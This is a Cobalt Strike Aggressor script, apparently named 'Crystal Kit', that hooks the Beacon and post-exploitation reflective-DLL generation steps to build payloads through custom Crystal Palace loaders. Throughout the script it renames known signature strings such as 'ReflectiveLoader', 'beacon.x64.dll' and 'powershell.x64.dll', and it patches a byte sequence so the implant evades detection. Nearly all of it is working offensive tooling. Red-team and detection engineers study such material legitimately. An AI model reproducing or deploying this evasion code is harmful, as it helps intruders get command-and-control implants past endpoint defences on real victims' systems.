debug ( 7 );

# We need to pass the Beacon DLL to Crystal Palace and have it process it via the specification
# file instead.  The first step is to ensure a copy of crystalpalace.jar exists inside the 
# Cobalt Strike client directory (alongside cobaltstrike-client.jar).
# Then we use the import keyword in Aggressor to access the required Java classes.
import crystalpalace.spec.* from: crystalpalace.jar;
import java.util.HashMap;

# ------------------------------------------------------------------
# A wrapper around strrep to pad the new string before replacing it.
# $1 = input dll
# $2 = original string
# $3 = new string
# return = the modified byte sequence
# ------------------------------------------------------------------
sub strrep_pad
{
    local ( '$input_dll $original_byte_sequence $new_byte_sequence $original_byte_sequence_length $new_byte_sequence_length $difference $padding $new_byte_sequence_padded' );
    
    $input_dll              = $1;
    $original_byte_sequence = $2;
    $new_byte_sequence      = $3;

    $original_byte_sequence_length = strlen ( $original_byte_sequence );
    $new_byte_sequence_length      = strlen ( $new_byte_sequence );

    if ( $new_byte_sequence_length > $original_byte_sequence_length )
    {
        warn ("Input string is too large");
        return $null;
    } 

    $difference = $original_byte_sequence_length - $new_byte_sequence_length;

    if ( $difference != 0 )
    {
        $padding = "\x00" x $difference;
        $new_byte_sequence_padded = $new_byte_sequence . $padding;
    }
    else
    {
        $new_byte_sequence_padded = $new_byte_sequence;
    }
    
    return strrep ( $input_dll, $original_byte_sequence, $new_byte_sequence_padded );
}

sub print_info {
   println ( formatDate ( "[HH:mm:ss] " ) . "\cE[Crystal Kit]\o " . $1 );
}

set BEACON_RDLL_GENERATE
{
    local ( '$beacon $arch $spec_path $spec $final' );

    $beacon = $2;
    $arch   = $3;

    if ( $arch eq "x86" )
    {
        warn ( "Crystal Kit is x64 only" );
        return $null;
    }

    # replace some common strings
    $beacon = strrep_pad ( $beacon, "beacon.x64.dll", "bacon.x64.dll" );
    $beacon = strrep_pad ( $beacon, "%02d/%02d/%02d", "%02d/%02d/%04d" );
    $beacon = strrep_pad ( $beacon, "%s as %s\%s: %d", "%s - %s\%s (%d)" );
    $beacon = strrep_pad ( $beacon, "\x48\x89\x5C\x24\x08\x57\x48\x83\xEC\x20\x48\x8B\x59\x10\x48\x8B\xF9\x48\x8B\x49\x08\xFF\x17\x33\xD2\x41\xB8\x00\x80\x00\x00", "\x48\x89\x5C\x24\x08\x57\x48\x83\xEC\x20\x48\x8B\x59\x10\x48\x8B\xF9\x48\x8B\x49\x08\xFF\x17\x33\xD2\x41\xB8\x01\x80\x00\x00" );

    print_info ( "BEACON_RDLL_GENERATE" );

    # Instead of reading the loader directly, we call the Crystal Palace Java API, providing the
    # path to the specification file and the raw Beacon DLL.
    $spec_path = getFileProper ( script_resource ( "loader" ), "loader.spec" );
    $spec      = [ LinkSpec Parse: $spec_path ];
    $final     = [ $spec run: $beacon, [ new HashMap ] ];

    # The output will be a PIC blob that contains the loader and Beacon DLL. If anything fails
    # and the script returns $null, it tells Cobalt Strike to fallback to its default loader.
    if ( strlen ( $final ) == 0 )
    {
        warn ( "Failed to build payload" );
        return $null;
    }

    print_info ( strlen ( $final ) );
    return $final;
}

set BEACON_RDLL_SIZE {
   return "0";
}

set BEACON_RDLL_GENERATE_LOCAL
{
    local ( '$beacon $arch $gmh $gpa $spec_path $spec $hash_map $final' );

    $beacon = $2;
    $arch   = $3;
    $gmh    = $5;
    $gpa    = $6;

    if ( $arch eq "x86" )
    {
        warn ( "Crystal Kit is x64 only" );
        return $null;
    }

    print_info ( "BEACON_RDLL_GENERATE_LOCAL" );

    $spec_path = getFileProper ( script_resource ( "local-loader" ), "loader.spec" );
    $spec      = [ LinkSpec Parse: $spec_path ];

    $hash_map  = [ new HashMap ];

    [ $hash_map put: "\$GMH", cast ( $gmh, 'b' ) ];
    [ $hash_map put: "\$GPA", cast ( $gpa, 'b' ) ];

    $final = [ $spec run: $beacon, $hash_map ];

    if ( strlen ( $final ) == 0 )
    {
        warn ( "Failed to build payload" );
        return $null;
    }

    print_info ( strlen ( $final ) );
    return $final;
}

# ------------------------------------
# $1 = DLL file name
# $2 = DLL content
# $3 = arch
# $4 = parent Beacon ID
# $5 = GetModuleHandle pointer
# $6 = GetProcAddress pointer
# ------------------------------------
set POSTEX_RDLL_GENERATE
{ 
    local ( '$postex $arch $gmh $gpa $spec_path $spec $hash_map $final' );
 
    $postex = $2;
    $arch   = $3;
    $gmh    = $5;
    $gpa    = $6;

    if ( $arch eq "x86" )
    {
        warn ( "Crystal Kit is x64 only" );
        return $null;
    }

    print_info ( "POSTEX_RDLL_GENERATE" );

    $postex = strrep_pad ( $postex, "w/hr", "err" );
    $postex = strrep_pad ( $postex, "[-]", "[!]" );
    $postex = strrep_pad ( $postex, "ReflectiveLoader", "legitLoader" );
    $postex = strrep_pad ( $postex, "invokeassembly.x64.dll", "revokeassembly.x64.dll" );
    $postex = strrep_pad ( $postex, "powershell.x64.dll", "weakshell.x64.dll" );

    $spec_path = getFileProper ( script_resource ( "postex-loader" ), "loader.spec" );
    $spec      = [ LinkSpec Parse: $spec_path ];

    $hash_map  = [ new HashMap ];

    [ $hash_map put: "\$GMH", cast ( $gmh, 'b' ) ];
    [ $hash_map put: "\$GPA", cast ( $gpa, 'b' ) ];

    $final = [ $spec run: $postex, $hash_map ];

    if ( strlen ( $final ) == 0 )
    {
       warn ( "Failed to build package" );
       return $null;
    }

    print_info ( strlen ( $final ) );
    return $final;
}
